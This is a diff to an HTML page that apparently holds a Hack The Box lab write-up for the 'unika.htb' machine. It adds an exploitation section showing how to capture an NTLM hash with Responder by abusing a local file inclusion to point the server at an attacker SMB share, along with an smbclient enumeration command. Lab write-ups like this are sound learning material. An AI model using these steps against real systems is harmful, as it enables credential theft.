@@ -31,11 +31,17 @@
             <h2>Check if NTLM is active</h2>
             <pre><code class="language-bash">smbclient -L $victim -U Administrator  </code></pre>
             
-            <h2>Section 2</h2>
-            <p>Forest</p>
+            <h2>Exploitation</h2>
+            <p>NTLM works sending challenge/response to the server. In this process a hash with the password of the user. To do so we need to create a resource that can be accesed from de victim. To do so
+               we created SMB server using responder </p>
+
+            <pre><code class="language-bash">sudo responder -I tun0</code></pre>   
+
+            <p> and accesed a resource from the server we just setup using a LFI in the victim to let responder intercept de hash</p>
+
+           <pre><code class="language-uri">http://unika.htb/index.php?page=//localip/resource</code></pre>    
             
-            <h2>Section 3</h2>
-            <p>This is some content in the third section. Keep the writing going!</p>
+            
         </div>
     </div>
 
